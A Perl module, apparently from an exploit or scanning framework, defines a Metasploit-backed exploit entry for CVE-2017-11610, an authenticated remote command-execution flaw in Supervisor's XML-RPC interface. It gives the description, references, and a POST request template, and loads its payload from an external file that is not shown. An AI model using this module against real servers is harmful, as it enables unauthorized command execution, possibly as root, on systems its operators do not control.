package SUPERVISOR::MSF::SupervisorXmlrpcExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SupervisorXmlrpcExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2017-11610",
  DESCRIPTION => "

        This module exploits a vulnerability in the Supervisor process control software, where an authenticated client

        can send a malicious XML-RPC request to supervisord that will run arbitrary shell commands on the server.

        The commands will be run as the same user as supervisord. Depending on how supervisord has been configured, this

        may be root. This vulnerability can only be exploited by an authenticated client, or if supervisord has been

        configured to run an HTTP server without authentication. This vulnerability affects versions 3.0a1 to 3.3.2.

      ",
  MSF_MODULE => "supervisor_xmlrpc_exec",
  PATHS => ["RPC2"],
  REFERENCES => [
    "https://github.com/Supervisor/supervisor/issues/964",
    "https://www.debian.org/security/2017/dsa-3942",
    "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11610",
    "https://github.com/phith0n/vulhub/tree/master/supervisor/CVE-2017-11610",
  ],
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The path to the XML-RPC endpoint", VALUE => "/RPC2" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => read_file('MSFExploits/SUPERVISOR/MSF/src/SupervisorXmlrpcExec.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'text/xml',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
